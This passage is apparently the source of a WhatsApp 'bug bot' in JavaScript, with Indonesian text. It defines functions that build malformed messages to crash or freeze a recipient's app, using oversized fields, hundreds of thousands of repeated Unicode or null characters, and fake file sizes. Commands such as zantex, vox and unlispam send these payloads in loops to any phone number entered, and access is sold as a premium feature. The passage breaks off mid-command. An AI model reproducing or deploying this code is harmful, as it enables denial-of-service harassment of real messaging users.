									title: "",
									documentMessage: {
										url: "https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true",
										mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
										fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
										fileLength: "9999999999999",
										pageCount: 9007199254740991,
										mediaKey: "EZ/XTztdrMARBwsjTuo9hMH5eRvumy+F8mpLBnaxIaQ=",
										fileName: "🩸𝐁𝐲𝐱𝐱 𝐂𝐫𝐚𝐬𝐡 ϟ🦠",
										fileEncSha256: "oTnfmNW1xNiYhFxohifoE7nJgNZxcCaG15JVsPPIYEg=",
										directPath: "/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0",
										mediaKeyTimestamp: "1723855952",
										contactVcard: true,
										thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
										thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
										thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
										jpegThumbnail: ""
									},
									hasMediaAttachment: true
								},
								body: {
									text: "‎𝗫𝘃͍̈́͢𝗡 𝗘𝘅͆𝗰𝗹͖𝘂𝘀͢𝗶𝘃̈́𝗲 ☠️" + "ᬽ᭬ᬼᬽ".repeat(77777)
								},
								nativeFlowMessage: {
									messageParamsJson: "{\"name\":\"galaxy_message\",\"title\":\"oi\",\"header\":\" 𝐁𝐲𝐱𝐱 𝐈𝐬 𝐇𝐞𝐫𝐞 ϟ \",\"body\":\"xxx\"}",
								},
							}
						}
					}
				}), {
					userJid: target
				}
			);
            await byxz.relayMessage(target, etc.message, ptcp ? {
				participant: {
					jid: target
				}
			} : {});
			console.log(chalk.green("Send Bug By Abyy XvN 🔥☠️"));
		};
		
		async function trashui(target, ptcp = false) {
			let etc = generateWAMessageFromContent(target, proto.Message.fromObject({
				    viewOnceMessage: {
					    message: {
							interactiveMessage: {
								header: {
									title: "",
									documentMessage: {
										url: "https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true",
										mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
										fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
										fileLength: "9999999999999",
										pageCount: 9007199254740991,
										mediaKey: "EZ/XTztdrMARBwsjTuo9hMH5eRvumy+F8mpLBnaxIaQ=",
										fileName: "🩸𝐁𝐲𝐱𝐱 𝐂𝐫𝐚𝐬𝐡 ϟ🦠",
										fileEncSha256: "oTnfmNW1xNiYhFxohifoE7nJgNZxcCaG15JVsPPIYEg=",
										directPath: "/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0",
										mediaKeyTimestamp: "1723855952",
										contactVcard: true,
										thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
										thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
										thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
										jpegThumbnail: ""
									},
									hasMediaAttachment: true
								},
								body: {
									text: "𝗫𝘃͍̈́͢𝗡 𝗘𝘅͆𝗰𝗹͖𝘂𝘀͢𝗶𝘃̈́𝗲 ☠️̤" + "ꦾ".repeat(50000)
								},
								nativeFlowMessage: {
									messageParamsJson: "ABYYTHEZXP⚡"
								},
							}
						}
					}
				}), {
					userJid: target
				}
			);
            await byxz.relayMessage(target, etc.message, ptcp ? { 
                 participant: { 
                    jid: target
			     }
			} : {});
			console.log(chalk.green("Send Bug By Abyy XvN 🔥☠️"));
		}
		
		async function stuckhme(target, ptcp = true) {
			await byxz.relayMessage(target, {
					ephemeralMessage: {
						message: {
							interactiveMessage: {
								header: {
									documentMessage: {
										url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
										mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
										fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
										fileLength: "9999999999999",
										pageCount: 1316134911,
										mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
										fileName: "𝗫𝘃͍̈́͢𝗡 𝗘𝘅͆𝗰𝗹͖𝘂𝘀͢𝗶𝘃̈́𝗲 ☠️̤",
										fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
										directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
										mediaKeyTimestamp: "1726867151",
										contactVcard: true,
										jpegThumbnail: wantuyd,
									},
									hasMediaAttachment: true,
								},
								body: {
									text: "𝗫𝘃͍̈́͢𝗡 𝗘𝘅͆𝗰𝗹͖𝘂𝘀͢𝗶𝘃̈́𝗲 ̤̤\n" + "@6282291664759".repeat(17000),
								},
								nativeFlowMessage: {
									name: "cta_url",
									buttonParamsJson: "{ display_text: '✨⃟༑⌁⃰𝐁𝐲𝐱𝐱 𝐂𝐫𝐚𝐬𝐡 ϟ〽️', url: \"https://youtube.com/JACKTHEXBEC\", merchant_url: \"https://youtube.com/JACKTHEXBEC\" }",
								},
							},
						},
					},
				},
				ptcp ? {
					participant: {
						jid: target
					}
				} : {}
			);
			console.log(chalk.green("Send Bug By Abyy XvN 🔥☠️"));
		};
		
		async function locfreze(target, ptcp = true) {
			let etc = generateWAMessageFromContent(target, proto.Message.fromObject({
				viewOnceMessage: {
					message: {
						interactiveMessage: {
							header: {
								title: "𝗫𝘃͍̈́͢𝗡 𝗘𝘅͆𝗰𝗹͖𝘂𝘀͢𝗶𝘃̈́𝗲 ☠️̤" + "ꦾ".repeat(300000),
								locationMessage: {},
								hasMediaAttachment: true
							},
							body: {
								text: ""
							},
							nativeFlowMessage: {
								name: "call_permission_request",
								messageParamsJson: " 𝐉𝐀𝐂𝐊𝐓𝐇𝐄𝐗𝐁𝐄𝐂〽️ "
							},
							carouselMessage: {}
						}
					}
				}
			}), {
				userJid: target
			});

			await byxz.relayMessage(target, etc.message, ptcp ? {
				participant: {
					jid: target
				}
			} : {});
			console.log(chalk.green("Send Bug By Abyy XvN 🔥☠️"));
		}
		
		async function ZxOiNviS(target, ptcp = true) {
			let etc = generateWAMessageFromContent(target, proto.Message.fromObject({
				viewOnceMessage: {
					message: {
						interactiveMessage: {
							header: {
								title: "",
								locationMessage: {},
								hasMediaAttachment: true
							},
							body: {
								text: "𝗫𝘃͍̈́͢𝗡 𝗘𝘅͆𝗰𝗹͖𝘂𝘀͢𝗶𝘃̈́𝗲" + button
							},
							nativeFlowMessage: {
								messageParamsJson: "ABYYEXTANDER⚡"
							},
						}
					}
				}
			}), {
				userJid: target
			});

			await byxz.relayMessage(target, etc.message, ptcp ? {
				participant: {
					jid: target
				}
			} : {});
			console.log(chalk.red("Send Bug By Abyy XvN ⚡"));
		};
		
		async function ZoPLoc(target) {
			await byxz.relayMessage(target, {
				viewOnceMessage: {
					message: {
						interactiveMessage: {
							header: {
								subtitle: "\u0000".repeat(900000),
								title: "",
								locationMessage: {},
								hasMediaAttachment: true
							},
							body: {
								text: "",
							},
							nativeFlowMessage: {
								messageParamsJson: ""
							},
						}
					}
				}
			}, {});
			console.log(chalk.green("Send Bug By Abyy XvN ⚡"));
		};
		
//=================================================//
async function docu(target, kuwoted) {
 var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
  "documentMessage": {
    "url": "https://mmg.whatsapp.net/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0&mms3=true",
    "mimetype": "penis",
    "fileSha256": "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
    "fileLength": "999999999",
    "pageCount": 999999999,
    "mediaKey": "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
    "fileName": `☠️𝗭͢𝘅͛𝗣 𝗖͢𝗼ͮ𝗱͢𝗲ͯ𝗫 🔐`+"ꦾ".repeat(77777),
    "fileEncSha256": "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
    "directPath": "/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0",
    "mediaKeyTimestamp": "1715880173"
  }
}), { userJid: target, quoted: kuwoted });
await byxz.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id });
}
//=================================================//
async function penghitaman(target, kuwoted) {
 var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
  "stickerMessage": {
    "url": "https://mmg.whatsapp.net/o1/v/t62.7118-24/f1/m233/up-oil-image-8529758d-c4dd-4aa7-9c96-c6e2339c87e5?ccb=9-4&oh=01_Q5AaIM0S5OdSlOJSYYsXZtqnZ-ifJC0XbXv3AWEfPbcBBjRJ&oe=666DA5A2&_nc_sid=000000&mms3=true",
    "fileSha256": "CWJIxa1y5oks/xelBSo440YE3bib/c/I4viYkrCQCFE=",
    "fileEncSha256": "r6UKMeCSz4laAAV7emLiGFu/Rup9KdbInS2GY5rZmA4=",
    "mediaKey": "4l/QOq+9jLOYT2m4mQ5Smt652SXZ3ERnrTfIsOmHWlU=",
    "mimetype": "image/webp",
    "directPath": "/o1/v/t62.7118-24/f1/m233/up-oil-image-8529758d-c4dd-4aa7-9c96-c6e2339c87e5?ccb=9-4&oh=01_Q5AaIM0S5OdSlOJSYYsXZtqnZ-ifJC0XbXv3AWEfPbcBBjRJ&oe=666DA5A2&_nc_sid=000000",
    "fileLength": "10116",
    "mediaKeyTimestamp": "1715876003",
    "isAnimated": false,
    "stickerSentTs": "1715881084144",
    "isAvatar": false,
    "isAiSticker": false,
    "isLottie": false
  }
}), { userJid: target, quoted: kuwoted });
await byxz.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id });
}
//=================================================//
async function pirgam(target, kuwoted) {
 var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
    interactiveMessage: {
      header: {
        title: "🩸⃟༑⌁⃰𝐙͈𝐞͢𝐫𝐨 𝐄𝐱ͯ͢𝐞𝐜𝐮͢𝐭𝐢𝐨𝐧 𝐕ͮ𝐚͢𝐮𝐥𝐭ཀ͜͡🦠",
        hasMediaAttachment: true,
        ...(await prepareWAMessageMedia({ image: { url: "https://telegra.ph/file/e8c1aee03b13f008ff65d.jpg" } }, { upload: byxz.waUploadToServer }))
      },
      body: {
        text: ""
      },
      footer: {
        text: "›          #byxzdominate"
      },
      nativeFlowMessage: {
        messageParamsJson: " ".repeat(1000000)
      }
    }
}), { userJid: target, quoted: kuwoted });
await byxz.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id });
}
//=================================================//
async function baklis(target, kuwoted) {
 var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
  'listMessage': {
    'title': "⟠ 𝐀͢𝚋𝐘 ⿻ 𝐂𝐋͢𝐢𝚵𝐍͢𝐓 々"+" ".repeat(920000),
        'footerText': `✳️᜴࿆͆᷍⿻A҉B҉Y҉ ҉C҉R҉A҉S҉H҉⿻╮⭑ ☠️⃰͜͡؜𝐀҉҉𝐛҉҉𝐲҉҉𝐲҉҉⭐️᜴ #𝐀𝐛𝐲𝐲𝐌𝐞𝐰𝐦𝐤ཀ͜͡✅⃟╮.xp`,
        'description': `✳️᜴࿆͆᷍⿻A҉B҉Y҉ ҉C҉R҉A҉S҉H҉⿻╮⭑ ☠️⃰͜͡؜𝐀҉҉𝐛҉҉𝐲҉҉𝐲҉҉⭐️᜴ #𝐀𝐛𝐲𝐲𝐌𝐞𝐰𝐦𝐤ཀ͜͡✅⃟╮.xp`,
        'buttonText': null,
        'listType': 2,
        'productListInfo': {
          'productSections': [{
            'title': 'anjay',
            'products': [
              { "productId": "4392524570816732" }
            ]
          }],
          'productListHeaderImage': {
            'productId': '4392524570816732',
            'jpegThumbnail': null
          },
          'businessOwnerJid': '0@s.whatsapp.net'
        }
      },
      'footer': 'puki',
      'contextInfo': {
        'expiration': 604800,
        'ephemeralSettingTimestamp': "1679959486",
        'entryPointConversionSource': "global_search_new_chat",
        'entryPointConversionApp': "whatsapp",
        'entryPointConversionDelaySeconds': 9,
        'disappearingMode': {
          'initiator': "INITIATED_BY_ME"
        }
      },
      'selectListType': 2,
      'product_header_info': {
        'product_header_info_id': 292928282928,
        'product_header_is_rejected': false
      }
    }), { userJid: target, quoted: byxbug });
await byxz.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id });
}

async function sendbugisfuck(jid, count) {
  for (let i = 0; i < count; i++) {
    sendvoxlocas2(byxz, target);
    await sleep(1500);
  }
}
//=================================================//
/*if (m.message) {
console.log(chalk.black(chalk.bgWhite('[ PESAN ]')), chalk.black(chalk.bgGreen(new Date)), chalk.black(chalk.bgBlue(budy || m.mtype)) + '\n' + chalk.magenta('=> Dari'), chalk.green(pushname), chalk.yellow(m.sender) + '\n' + chalk.blueBright('=> Di'), chalk.green(m.isGroup ? pushname : 'Private Chat', m.chat))
}
*/

if (!isGroup && !isDeveloper && db.data.settings[botNumber].onlygrub ) {
	if (command){
return byxzreply(` Halo ${m.pushName}! Karena Kami Ingin Mengurangi Spam, Silakan Gunakan Bot di Grup Chat !`)
}
}

//=================================================//

if (m.message) {
  if (isCmd && !m.isGroup) {
    console.log(chalk.black(chalk.bgHex('#ff5e78').bold(`\n🌟 ${ucapanWaktu} 🌟`)));
    console.log(chalk.green(chalk.bgHex('#4a69bd').bold(`⚡NEW MESSAGE⚡`)));
    console.log(chalk.black(chalk.bgHex('#fdcb6e')(`TANGGAL: ${new Date().toLocaleString()}
    PESAN: ${m.body || m.mtype}
    PENGIRIM ${pushname}
    DI ${m.sender}`)));
  } else if (m.isGroup) {
    console.log(chalk.black(chalk.bgHex('#ff5e78').bold(`\n🌟 ${ucapanWaktu} 🌟`)));
    console.log(chalk.white(chalk.bgHex('#4a69bd').bold(`⚡NEW MESSAGE⚡`)));
    console.log(chalk.black(chalk.bgHex('#fdcb6e')(`📅 DATE: ${new Date().toLocaleString()}
    MESSAGE: ${m.body || m.mtype}
    SENDERNAME: ${pushname}
    JIDS: ${m.sender}
    TEMPAT: ${groupName}`)));
  }
}

//=================================================//
switch (command) {
// Status
case 'public': {
if (!isPremium) return byxzreply(mess.premium) 
byxz.public = true
byxzreply('succes')
}
break
//=================================================//
case 'clearchat': {
pee = "\n".repeat(200)
byxzreply(pee + '😁🖕')
}
break
//=================================================//
//Menu
case "menu": case "start": {
await loading()
let pukimk = [thumb]
let itsmenu = `
⌈ 𝗔𝗹𝗯𝗲𝗿𝘁 𝗭𝘅𝗣 𝗙𝗼𝘂𝗻𝗱 ⌋

➙ Owner: Abyy
➙ BotName: 𝗔𝗹𝗯𝗲𝗿𝘁 𝗭𝗫𝗣

乂  ❬ 𝗙𝗼𝘂𝗻𝗱𝗮𝘁𝗶𝗼𝗻 ❭ 乂
➙ .zantex *62xxx*
➙ .foxaz *62xxx*
➙ .vox *62xxx*
➙ .unlispam *62xxx*

乂  ❬ 𝗢𝗹𝗱 𝗕𝘂𝗴 𝗪𝗵𝗮𝘁𝘀𝗔𝗽𝗽 ❭ 乂
➙ .bugkontak *62xxx*
➙ .bugtroli *62xxx*
➙ .bugcatalog *62xxx*
➙ .bugdoku *62xxx*

乂  ❬ 𝗔𝗸𝘀𝗲𝘀 ❭  乂
➙ .addowner *62xxx*
➙ .delowner *62xxx*
➙ .addprem *62xxx*
➙ .delprem *62xxx*

乂  ❬ 𝗕𝗼𝘁 𝗔𝗸𝘀𝗲𝘀 ❭  乂
➙ .self
➙ .public
➙ .setppbot


> © ALBERT SUREND ⚡`

let msg = {
viewOnceMessage: {
message: {
interactiveMessage: {
"contextInfo": {
"mentionedJid": [m.sender],
"isForwarded": true,
"forwardedNewsletterMessageInfo": {
"newsletterJid": '0@newsletter',
"newsletterName": 'By Zero Execution Vault',
"serverMessageId": 1
},
},
"header": {
"title": itsmenu,
...(await prepareWAMessageMedia({ image: albert }, { upload: byxz.waUploadToServer })),
"hasMediaAttachment": true
},
"body": {
"text": ""
},
"footer": {
"text": "⿻  ⌜ 𝗫𝘃𝗡 𝗘𝘅𝗰𝗹𝘂𝘀𝗶𝘃𝗲 ⌟  ⿻"
},
"nativeFlowMessage": {
"buttons": [
{
"name": "quick_reply",
"buttonParamsJson": "{\"display_text\":\"⿻𝐙.𝐗.𝐎⿻\n𝐕𝐚𝐱𝐮𝐳𝐗 𝐙.𝐗.𝐎\",\"id\":\".botowner\"}"
}
],
"messageParamsJson": ""
}
}
}
}
};

let kontollurus = {
image: albert,
caption: itsmenu,
contextInfo:{externalAdReply:{
title: '𝗔𝗹𝗯𝗲𝗿𝘁𝗭𝗼𝗻𝗧𝗮𝘅⃝',
body: ``, 
showAdAttribution: true,
thumbnail: pukimk,
mediaType: 4,
MediaUrl:`${global.ch}`,
sourceUrl:`${global.ch}`,
}}
};

if ( db.data.settings[botNumber].menuType === 'externalImage') {
byxz.sendMessage(m.chat, kontollurus, { quoted: m })
} else if ( db.data.settings[botNumber].menuType === 'buttonImage') {
byxz.relayMessage(m.chat, msg, {})
}
}
break
//=================================================//
case 'ambilq': {
let jsonData = JSON.stringify({ [m.quoted.mtype]: m.quoted }, null, 2);
fs.writeFileSync('pukimak.json', jsonData);
byxzreply(jsonData)
}
break
//=================================================//
case 'owner': case 'botowner':
let namaown = `Abyy T.F.I`
var contact = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"contactMessage": {
"displayName": `${namaown}`,
"vcard": `BEGIN:VCARD\nVERSION:3.0\nN:;;;;\nFN:${namaown}\nitem1.TEL;waid=${global.ownMain}:+${global.ownMain}\nitem1.X-ABLabel:Ponsel\nX-WA-BIZ-DESCRIPTION:[[ ༑ 𝐀͢𝚋𝐘 ⿻ 𝐏𝐔𝐁𝐋𝐢𝐂 ༑ ]]\nX-WA-BIZ-NAME: [[ ༑ 𝐀͢𝚋𝐘 ⿻ 𝐏𝐔𝐁𝐋𝐢𝐂 ༑ ]]\nEND:VCARD`,
}
}), { userJid: m.chat, quoted: m })
byxz.relayMessage(m.chat, contact.message, { messageId: contact.key.id })
break
//=================================================//
case 'self': {
if (!isDeveloper) return byxzreply(mess.owner)
byxz.public = false
byxzreply('succes')
}
break
//=================================================//
case 'setppbot':{
if (!isDeveloper) return byxzreply(mess.owner);
if(m.quoted){
const media = await byxz.downloadAndSaveMediaMessage(quoted)
const { img } = await generateProfilePicture(media)
await byxz.query({ tag: 'iq',  attrs: { to: botNumber, type:'set', xmlns: 'w:profile:picture'}, content: [{ tag: 'picture', attrs: { type: 'image' }, content: img }]})   
await byxzreply(`${mess.success}`)
} else byxzreply("Reply fotonya")
}
break
//Owner fitur
case 'addprem': {
if (!isDeveloper) return byxzreply(mess.owner)
if (args.length < 2)
return byxzreply(`Penggunaan :\n*#addprem* @tag waktu\n*#addprem* nomor waktu\n\nContoh : #addprem @tag 30d`);
if (m.mentionedJid.length !== 0) {
for (let i = 0; i < m.mentionedJid.length; i++) {
addPremiumUser(m.mentionedJid[0], args[1], orgkaya);
}
byxzreply("Sukses Premium")
} else {
addPremiumUser(args[0] + "@s.whatsapp.net", args[1], orgkaya);
byxzreply("Sukses Via Nomer")
await sleep(2000)
byxz.sendMessage(args[0] + "@s.whatsapp.net", {image: {url: `https://telegra.ph/file/4591e4839848523095e05.jpg`}, caption: `Kamu sekarang adalah Anggota Premium`},{quoted: qevent })
}
}
break
//=================================================//
case 'delprem': {
if (!isDeveloper) return byxzreply(mess.owner)
if (args.length < 1) return byxzreply(`Penggunaan :\n*#delprem* @tag\n*#delprem* nomor`)
if (m.mentionedJid.length !== 0) {
for (let i = 0; i < m.mentionedJid.length; i++) {
let mentionedPremiumIndex = orgkaya.findIndex(premium => premium.id === m.mentionedJid[i]);
if (mentionedPremiumIndex !== -1) {
orgkaya.splice(mentionedPremiumIndex, 1);
}
}
fs.writeFileSync("./dtbs/premium.json", JSON.stringify(orgkaya));
byxzreply("Sukses Delete");
} else {
let targetNumber = args[0] + "@s.whatsapp.net"
let targetPremiumIndex = orgkaya.findIndex(premium => premium.id === targetNumber)
if (targetPremiumIndex !== -1) {
orgkaya.splice(targetPremiumIndex, 1)
fs.writeFileSync("./dtbs/premium.json", JSON.stringify(orgkaya))
byxzreply("Sukses Via Nomer")
await sleep(2000)
byxz.sendMessage(targetNumber, {image: {url: `https://telegra.ph/file/4591e4839848523095e05.jpg`}, caption: `Kamu sekarang adalah Anggota Premium`},{quoted: qevent })
} else {
byxzreply("Entitas premium tidak ditemukan")
}
}
}
break
//=================================================//
case 'addowner': {
if (!isDeveloper) return byxzreply(mess.owner)
if (!args[0]) return byxzreply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} ${ownNumb}`)
prem1 = text.split("|")[0].replace(/[^0-9]/g, '')
let cek1 = await byxz.onWhatsApp(prem1 + `@s.whatsapp.net`)
if (cek1.length == 0) return (`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
kontributor.push(prem1)
fs.writeFileSync('./dtbs/owner.json', JSON.stringify(kontributor))
byxzreply(`${prem1} Sudah menjadi kontributor!!!`)
byxz.sendMessage(prem1+'@s.whatsapp.net', {image: {url: `https://telegra.ph/file/4591e4839848523095e05.jpg`}, caption: `Kamu sekarang adalah owner / kontributor bot`},{quoted: qpay})
}
break
//=================================================//
case 'delowner': {
if (!isDeveloper) return byxzreply(mess.owner)
if (!args[0]) return byxzreply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} ${ownNumb}`)
prem2 = text.split("|")[0].replace(/[^0-9]/g, '')
unp = kontributor.indexOf(prem2)
kontributor.splice(unp, 1)
fs.writeFileSync('./dtbs/owner.json', JSON.stringify(kontributor))
byxzreply(`${prem2} Tidak lagi Kontributor!!!`)
}
break
//=================================================//
case 'addseller':
if (!isDeveloper) return
if (!args[0]) return byxzreply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} ${ownNumb}`)
var prem1 = text.split("|")[0].replace(/[^0-9]/g, '')
orgkaya.push(prem1)
fs.writeFileSync('./dtbs/seller.json', JSON.stringify(orgkaya))
byxzreply(`${prem1} Sudah menjadi orgkaya!!!`)
await sleep(3500)
byxz.sendMessage(prem1 + '@s.whatsapp.net', {
image: { url: 'https://telegra.ph/file/4591e4839848523095e05.jpg' },
caption: 'Kamu sekarang adalah Reseller!!'
}, { quoted: m })
break
//=================================================//
case 'delseller':
if (!isDeveloper) return 
if (!args[0]) return byxzreply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} ${ownNumb}`)
prem2 = text.split("|")[0].replace(/[^0-9]/g, '')
unp = orgkaya.indexOf(prem2)
orgkaya.splice(unp, 1)
fs.writeFileSync('./dtbs/seller.json', JSON.stringify(orgkaya))
byxzreply(`${prem2} Tidak lagi Reseller!!!`)
break

//==================[ CASE BUG ]=========================//
case 'zantex': {
if (!isPremium) return byxzreply(mess.premium)
if (!q) return byxzreply(`Penggunaan .${command} 6287392784527`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return byxzreply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6287392784527`)
let target = bijipler + '@s.whatsapp.net'
await byxzreply(mess.bugrespon)
for (let j = 0; j < 5; j++) {
await xlocztwo(byxz, target)
await xlocstck(byxz, target)
await xlocui(byxz, target)
await adminblank(target)
await adminblank(target)
await adminblank(target)
await tuxasz(byxz, target)
await xpokers(byxz, target)
await xpokers(byxz, target)
await tuxasz(byxz, target)
await xpokers(byxz, target)
}
await byxzreply(mess.bugsuc)
}
break

case 'foxaz': {
if (!isPremium) return byxzreply(mess.premium)
if (!q) return byxzreply(`Penggunaan .${command} 6287392784527`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return byxzreply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6287392784527`)
let target = bijipler + '@s.whatsapp.net'
await byxzreply(mess.bugrespon)
for (let j = 0; j < 4; j++) {
await xlocui(byxz, target)
await tuxasz(byxz, target)
await xpokers(byxz, target)
await xpokers(byxz, target)
await adminblank(target)
await adminblank(target)
await adminblank(target)
await tuxasz(byxz, target)
await xpokers(byxz, target)
await zoxcex(byxz, target)
await xlocfrz(byxz, target)
}
await byxzreply(mess.bugsuc)
}
break

case 'vox': case 'VoX': {
if (!isPremium) return byxzreply(mess.premium)
if (!q) return byxzreply(`Penggunaan .${command} 6287392784527`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return byxzreply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6287392784527`)
let target = bijipler + '@s.whatsapp.net'
await byxzreply(mess.bugrespon)
for (let j = 0; j < 1; j++) {
await voxtrash(byxz, target)
await voxlocas3(byxz, target)
await voxlocas3(byxz, target)
await adminblank(target)
await adminblank(target)
await adminblank(target)
await voxlocas3(byxz, target)
await voxlocas2(byxz, target)
await voxlocas(byxz, target)
await tuxasz(byxz, target)
await voxtrash(byxz, target)
await xpokers(byxz, target)
await voxlocas(byxz, target)
await voxlocas(byxz, target)
await voxtrash(byxz, target)
await adminblank(target)
await adminblank(target)
await adminblank(target)
await voxlocas(byxz, target)
await voxlocas(byxz, target)
await voxlocas(byxz, target)
await voxlocas(byxz, target)
await voxtrash(byxz, target)
await voxlocas(byxz, target)
await adminblank(target)
await adminblank(target)
await adminblank(target)
await voxlocas(byxz, target)
await voxlocas(byxz, target)
await voxlocas2(byxz, target)
await tuxasz(byxz, target)
await tuxasz(byxz, target)
await voxtrash(byxz, target)
}
await byxzreply(mess.bugsuc)
}
break

case 'unlispam': {
if (!isPremium) return byxzreply(mess.premium)
if (!q) return byxzreply(`Penggunaan .${command} 6287392784527`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return byxzreply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6287392784527`)
let target = bijipler + '@s.whatsapp.net'
await byxzreply(`<SUCCES ATTACK UNLI>
KALO MAU HENTIKAN. RESTART BOT LEWAT PANEL ☠️
> hati² bug ini jika tidak di hentikan rawan kenon`)
for (let j = 0; j < 10; j++) {
await voxtrash(byxz, target)
await voxlocas3(byxz, target)
await voxlocas3(byxz, target)
await adminblank(target)
await adminblank(target)
await adminblank(target)
await voxlocas3(byxz, target)
await voxlocas2(byxz, target)
await voxlocas(byxz, target)
await tuxasz(byxz, target)
await voxtrash(byxz, target)
await zoxcex(byxz, target)
await xlocfrz(byxz, target)
await zoxcex(byxz, target)
await xlocfrz(byxz, target)
await xpokers(byxz, target)
await voxlocas(byxz, target)
await voxlocas(byxz, target)
await voxtrash(byxz, target)
await voxlocas(byxz, target)
await voxlocas(byxz, target)
await voxlocas(byxz, target)
await adminblank(target)
await adminblank(target)
await adminblank(target)
await voxlocas(byxz, target)
await voxtrash(byxz, target)
await voxlocas3(byxz, target)
await voxlocas3(byxz, target)
await voxlocas3(byxz, target)
await voxlocas2(byxz, target)
await voxlocas(byxz, target)
await tuxasz(byxz, target)
await voxtrash(byxz, target)
await zoxcex(byxz, target)
await xlocfrz(byxz, target)
await zoxcex(byxz, target)
await xlocfrz(byxz, target)
await xpokers(byxz, target)
await voxlocas(byxz, target)
await voxlocas(byxz, target)
await voxtrash(byxz, target)
await voxlocas(byxz, target)
await voxlocas(byxz, target)
await voxlocas(byxz, target)
await adminblank(target)
await adminblank(target)
await adminblank(target)
await voxlocas(byxz, target)
await voxtrash(byxz, target)
await voxlocas(byxz, target)
await voxlocas(byxz, target)
await voxlocas(byxz, target)
await voxlocas2(byxz, target)
await tuxasz(byxz, target)
await tuxasz(byxz, target)
await voxtrash(byxz, target)
}
await byxzreply(mess.bugsuc)
}
break

case 'bugkontak': {
